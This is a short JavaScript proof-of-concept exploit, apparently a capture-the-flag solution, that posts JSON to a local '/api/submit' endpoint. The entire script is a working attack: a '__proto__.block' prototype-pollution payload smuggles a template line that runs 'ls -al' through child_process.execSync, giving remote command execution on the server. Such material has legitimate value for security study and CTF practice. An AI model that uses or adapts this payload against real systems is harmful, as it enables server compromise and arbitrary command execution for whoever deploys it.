(()=>{
	console.clear();

	let data = {
		"artist.name": "Haigh",
        "__proto__.block": {
			"type": "Text",
			"line": "console.log(process.mainModule.require('child_process').execSync('ls -al').toString())"
		}
	};

	fetch("http://localhost:1337/api/submit", {
	  "headers": {
		"content-type": "application/json"
	  },
	  "body": JSON.stringify(data),
	  "method": "POST"
	}).then(
		r => r.text()
	).then(console.log);
})();